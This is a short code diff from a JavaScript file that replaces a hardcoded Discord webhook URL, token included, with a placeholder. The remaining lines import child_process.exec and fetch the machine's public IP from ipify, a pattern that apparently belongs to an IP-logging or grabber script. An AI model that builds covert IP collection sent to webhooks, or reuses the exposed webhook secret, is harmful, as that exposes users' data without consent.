@@ -1,6 +1,6 @@
 const { Webhook } = require('discord-webhook-node');
 let request = require('request');
-const logs = new Webhook("https://discord.com/api/webhooks/864666229020295178/Rby7uaO3EPxEs-RxhKZDNrDqREIpO1D4MGn1oJtbU-vi7wTNUcPGn8r0UqfsSLU02gms");//webhook link
+const logs = new Webhook("webhook link");//webhook link
 const { exec } = require("child_process");
 
 request.get(`https://api.ipify.org`, function(err, response, body) {
